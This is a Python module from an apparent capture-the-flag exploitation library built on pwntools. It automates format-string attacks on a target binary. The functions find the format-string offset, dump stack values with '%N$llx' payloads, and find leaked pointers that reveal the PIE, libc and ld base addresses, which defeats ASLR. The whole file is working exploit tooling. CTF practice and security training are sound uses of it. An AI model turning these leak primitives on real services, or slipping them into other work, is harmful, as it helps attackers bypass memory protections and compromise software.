from typing import Callable, Union, List, Tuple, Optional

import pwnlib.tubes.process
from pwnlib.context import context

from ctflib.pwn.util import decode_to_ascii, get_pie_base, get_libc_base, get_ld_base, SetupFunction, SendFunction


def find_offset(setup: SetupFunction, max_input_length: Union[int, None] = None) -> int:
    stack = dump_stack(setup, max_input_length, 1, 30)
    for i, out in enumerate(stack):
        if out is None:
            continue
        if len(hex(out)) % 2:
            continue
        out = decode_to_ascii(out)
        if b"$llx" in out or b"ZZ" in out or b"$x" in out:
            return i + 1


def read_stack(sf: SendFunction, indexes: List[int]) -> Tuple[pwnlib.tubes.process.process, List[int]]:
    payload = []
    for i in indexes:
        # If 64 bit, use %llx
        if context.arch == "amd64":
            payload.append(f"%{i}$llx")
        else:
            payload.append(f"%{i}$x")
    payload = "ZZ" + ".".join(payload) + "ZZ"
    p, res = sf(payload)
    for line in res:
        if b"ZZ" in line:
            returned_string = line.split(b"ZZ")[1].split(b"ZZ")[0]
            ret = [int(x, 16) for x in returned_string.split(b".")]
            assert len(ret) == len(
                indexes), "Returned item length does not match index length. Batch size probably too high"
            return p, ret
    raise Exception("Process did not echo sent data. Perhaps echoed data is not within 30 lines of output")


def dump_stack(sf: SendFunction, max_input_length: Union[None, int] = None,
               offset: int = 6, until: int = 30) -> List[int]:
    if max_input_length is None:
        batch_size = 3
    else:
        batch_size = max_input_length // 10
    output = []
    for i in range(offset, until, batch_size):
        p, out = read_stack(sf, [x for x in range(i, i + batch_size)])
        if not out:
            output.extend([None] * batch_size)
        else:
            output.extend(out)
        p.close()
    return output


def __leak_base(sf: SendFunction, func: Callable[[int], int], max_input_length: Union[None, int] = None,
                offset: int = 6, until: int = 30) -> Optional[List[Tuple[int, int]]]:
    if max_input_length is None:
        batch_size = 3
    else:
        batch_size = max_input_length // 10
    print(f"Batch size: {batch_size}")
    output = [[], []]
    for j in range(2):
        for i in range(offset, until, batch_size):
            p, out = read_stack(sf, [x for x in range(i, i + batch_size)])
            if out:
                for item in out:
                    output[j].append((item, func(p.pid)))

    def sub(a, b):
        return a - b

    out = []
    for i in range(len(output[0])):
        run1 = sub(*output[0][i])
        run2 = sub(*output[1][i])
        if run1 == run2:
            out += [(i + offset, -run1)]
    return out


def leak_pie_base(setup: SendFunction, max_input_length: Union[None, int] = None,
                  offset: int = 6, until: int = 30) -> Optional[List[Tuple[int, int]]]:
    return __leak_base(setup, get_pie_base, max_input_length, offset, until)


def leak_libc_base(setup: SendFunction, max_input_length: Union[None, int] = None,
                   offset: int = 6, until: int = 30) -> Optional[List[Tuple[int, int]]]:
    return __leak_base(setup, get_libc_base, max_input_length, offset, until)


def leak_ld_base(setup: SendFunction, max_input_length: Union[None, int] = None,
                 offset: int = 6, until: int = 30) -> Optional[List[Tuple[int, int]]]:
    return __leak_base(setup, get_ld_base, max_input_length, offset, until)
